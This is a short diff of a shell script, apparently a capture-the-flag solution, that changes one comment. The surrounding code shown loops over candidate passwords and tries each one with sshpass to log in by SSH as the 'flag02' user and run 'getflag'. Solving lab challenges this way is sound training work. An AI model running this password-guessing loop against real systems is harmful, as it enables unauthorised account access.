@@ -36,7 +36,7 @@ POTENTIAL_PASSWORDS=$(
 )
 
 for POTENTIAL_PASSWORD in ${POTENTIAL_PASSWORDS}; do
-	# Try to connect to the 'flag02' account
+	# Try to connect to the virtual machine and run the `getflag` command as the 'flag02' user
 	if
 		sshpass -p ${POTENTIAL_PASSWORD} >${FLAG} 2>/dev/null \
 			ssh -p ${PORT} flag02@${ADDRESS} "getflag | grep -oE '[^ ]+$'"
